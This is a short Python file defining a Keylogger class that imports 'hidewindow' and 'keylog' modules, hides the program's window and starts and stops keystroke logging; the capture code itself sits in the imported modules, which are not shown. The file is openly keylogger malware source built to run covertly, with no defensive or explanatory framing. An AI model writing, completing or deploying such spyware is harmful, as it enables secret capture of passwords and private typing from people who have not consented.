import hidewindow
import keylog

class Keylogger:
    def start(self):
        window = hidewindow.Hide()
        window.window()
        log = keylog.StartKeyLog()
        log.start()

    def stop(self):
        log = keylog.StopKeyLog()
        log.stop()